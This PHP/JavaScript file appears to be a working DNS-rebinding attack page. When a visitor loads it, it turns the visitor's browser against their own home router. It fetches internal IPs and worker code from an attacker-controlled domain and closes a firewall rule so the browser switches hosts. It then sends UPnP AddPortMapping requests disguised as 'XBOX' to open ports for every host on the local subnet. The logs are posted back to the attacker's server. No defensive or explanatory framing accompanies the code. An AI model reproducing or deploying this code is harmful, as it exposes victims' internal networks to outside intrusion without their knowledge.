<?php
//Start the session (Import variables)
session_start();
//Setup uniqueid subdomain
//$_SESSION["uid"] = uniqid();
//$_SESSION["domain"] = ".test.com";
?>
<?php //These are the URLs to look for on the UPnP Gateway ?>
var urls = ["/DeviceDescription.xml", "/rootDesc.xml", "/upnp/rootdevice.xml", "/upnpdev.xml", "/igd.xml", "/InternetGatewayDevice.xml", "/IGDdevicedesc.xml", "/xml/igdIPDesc.xml", "/WFADevice.xml", "/Public_UPNP_gatedesc.xml"];
<?php //This is the variable to store the correct control URL ?>
var corrurl = "";
<?php //This is the variable to store the correct schema ?>
var schematype = "";
<?php include 'config.php'; 

//This is the array of ports to open for each host found
echo 'var opnports = ' . $opnports . ";\n";
echo 'var startportnum = ' . $startportnum . ";\n";
echo 'var uniqdom = "' . $_SESSION["uid"].$_SESSION["domain"] . "\";\n";
?>
<?php //This is the array of internal IP addresses ?>
var getips = httpGet("http://d0." + uniqdom + "/i0.php", false).split(';');
var intips = [ getips[0], getips[1]];
var sub = getips[3];
var logs = "";

var xmlhttp = new Array();


var retrycounter = 0;
var workernum = 30;
var workers = [];
var workerjs = "";
var blob;

//Async request for worker code
xmlhttpworker = new XMLHttpRequest();
xmlhttpworker.onreadystatechange=function()
  {
  if (xmlhttpworker.readyState==4 && xmlhttpworker.status==200)
    {
    	workerjs = xmlhttpworker.responseText;
	buildblob();
	buildworkers();
	closefw();
    }
  }
xmlhttpworker.open("GET","http://" + uniqdom + '/open.js',true);
xmlhttpworker.send();

function buildblob() {

	try {
    		blob = new Blob([workerjs], {type: 'application/javascript'});
	} catch (e) { // Backwards-compatibility
    		window.BlobBuilder = window.BlobBuilder || window.WebKitBlobBuilder || window.MozBlobBuilder;
    		blob = new BlobBuilder();
    		blob.append(response);
    		blob = blob.getBlob();
	}

}

function workermessage(e) {
	console.log('Message received from worker: ' + e.data[0]);
	if (e.data[0] == "Logs")
	{
		logs = logs + e.data[1];
		postlogs();
	}
}

function workererror(event){
    throw new Error(event.message + " (" + event.filename + ":" + event.lineno + ")");
};
function buildworkers() {
	//Create workers and put them in array
	for (i = 0; i < workernum; i++)
	{
		//workers[i] = new Worker('open.js');
		workers[i] = new Worker(URL.createObjectURL(blob));
		workers[i].onmessage = workermessage;
		workers[i].onerror = workererror;
	}
}
function opnip(iparray)
{
	if (typeof iparray === 'undefined')
	{
		iparray = intips;
	}
	for (i=0; i < iparray.length; i++)
	{
		for (j=0; j < opnports.length; j++)
		{
			var portarr = opnports[j].split(":");
			var proto = portarr[1];
			var intportnum = portarr[0];
			logs = logs + startportnum + "---" + iparray[i] + ":" + intportnum + "_" + proto + '<br>';
			//alert("start");
			loadXMLDoc(corrurl, schematype, startportnum, intportnum, proto, iparray[i]);
			startportnum++;
		}
	}
}

function loadXMLDoc(url, schema, extport, intport, proto, intip) {
		//document.write("startxml");
	req = false;
    // branch for native XMLHttpRequest object
			req = new XMLHttpRequest();
	if(req) {
		//document.write("postxml");
		req.onreadystatechange = processReqChange;
		req.open("POST", url, true);
		req.setRequestHeader('SOAPAction', '"' + schema + '#AddPortMapping"');

		req.send('<?php echo '<?'?>xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewRemoteHost xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="string"></NewRemoteHost><NewExternalPort xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="ui2">'+ extport + '</NewExternalPort><NewProtocol xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="string">' + proto + '</NewProtocol><NewInternalPort xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="ui2">' + intport + '</NewInternalPort><NewInternalClient xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="string">' + intip + '</NewInternalClient><NewEnabled xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="boolean">1</NewEnabled><NewPortMappingDescription xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="string">XBOX</NewPortMappingDescription><NewLeaseDuration xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="ui4">0</NewLeaseDuration></m:AddPortMapping></SOAP-ENV:Body></SOAP-ENV:Envelope>');
	}
}
function processReqChange() {
    // only if req shows "loaded"
    if (req.readyState == 4) {
        // only if "OK"
        if (req.status == 200) {
            // ...processing statements go here...
		//alert(req.responseText);
        } else {
           logs = logs + "There was a problem retrieving the XML data:\n" + req.statusText + '<br>';
        }
    }
}
function openNet(net) {
  net = net.replace(/(\d+\.\d+\.\d+)\.\d+/, '$1.');
  var tmparray = [];
  //255 / number of workers
  var sectionsize = Math.ceil(255 / workers.length);
  var portsize = opnports.length;
  for (var i = 1; i < 256; ++i) {
	if (intips.indexOf(net+i) == -1){
		tmparray.push(net + i);
	}
  }
  //for each worker, break off a chunk
  for (var i=0; i < workers.length; i++) {
		chunk = tmparray.splice(0,sectionsize)
		console.log('Chunk ready to be sent: ' + chunk);
		console.log('Startportnum is : ' + startportnum);
		console.log('Control URL is : ' + corrurl);
		controlurl = "http://" + uniqdom + ":" + location.port + corrurl;
  		workers[i].postMessage([chunk, controlurl, schematype, startportnum]);
		//Add correct amount of ports based on number of ports to open times num of hosts in the chunk
		startportnum = startportnum + (sectionsize * portsize);
		console.log('Startportnum changed to : ' + startportnum);
  }
  //opnip(tmparray);
}
function postlogs()
{
	var postint = httpPost("http://d0.<?php echo $_SESSION["uid"]; echo $_SESSION["domain"]?>/r0.php",logs);
}
function finish()
{
	var bs = httpPost("http://d0.<?php echo $_SESSION["uid"]; echo $_SESSION["domain"];?>/c0.html", btoa(location.port));	
}
function pausecomp(millis)

{
  var date = new Date();
  var curDate = null;
  do { curDate = new Date(); }
  while(curDate-date < millis);
}
function httpGet(theUrl, async)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    if (async == true)
    {
    	xmlHttp.timeout = 5;
    }
    xmlHttp.open( "GET", theUrl, async);
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
function httpPost(theUrl,theText)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "POST", theUrl, false);
    xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlHttp.send(theText);
    return xmlHttp.responseText;
}
function closefw()
{
	xmlHttp = new XMLHttpRequest();
	xmlHttp.onreadystatechange=function()
  	{
  		if (xmlHttp.readyState==4 && xmlHttp.status==200)
    		{
			//Do this to fail the first request and have the browser switch
			httpGet("http://" + uniqdom + ":" + location.port + "/dead.html", true);
			httpGet("http://" + uniqdom + ":" + location.port + "/dead2.html", true);
			go();
    		}
  	}
	//This closes firewall on original ip.
	xmlHttp.open("POST","http://d1." + uniqdom + "/c1.html",true);
    	xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	xmlHttp.send(btoa(location.port));
}
function go()
{
	setTimeout( function(){
		//Let's pause for a sec
		//pausecomp(500);
		for (index = 0; index < urls.length; index++)
		{
			(function(index) 
			{
			xmlhttp[index]=new XMLHttpRequest();
			xmlhttp[index].onreadystatechange = function ()
			{
				console.log('Onreadcalled Status: ' + xmlhttp[index].status);
				if (xmlhttp[index.status]==0)
				{
					retrycounter++;
					if (retrycounter == urls.length)
					{
						retrycounter = 0;
						go();
					}
				}
				if (xmlhttp[index].readyState==4 && xmlhttp[index].status==200)
				{
						console.log('Success');
						xmlDoc = xmlhttp[index].responseXML;
						x = xmlDoc.getElementsByTagName("service");
						for (i=0; i < x.length; i++)
						{
						        y = x[i].getElementsByTagName("serviceType");
						        if (y[0].innerHTML == ("urn:schemas-upnp-org:service:WANIPConnection:1" || "urn:schemas-upnp-org:service:WANPPPConnection:1"))
						        {
						                corrurl = x[i].getElementsByTagName("controlURL")[0].innerHTML;
								schematype = y[0].innerHTML;
								console.log('About to post message to worker Control URL: ' + corrurl);
								opnip(intips);
								openNet(getips[0]);
								
						        }
						  }
				}
			   };		
			try
			{
				xmlhttp[index].open("GET",urls[index],true);
				xmlhttp[index].send();
			}
			catch(e)
			{
			}
			})(index);
	
		}
		
	}, 0)
	setTimeout( function() {
		var postint = httpPost("http://d0.<?php echo $_SESSION["uid"]; echo $_SESSION["domain"]?>/r0.php",logs);
	
	var bs = httpPost("http://d0.<?php echo $_SESSION["uid"]; echo $_SESSION["domain"];?>/c0.html", btoa(location.port));
	
	}, 500000);
}
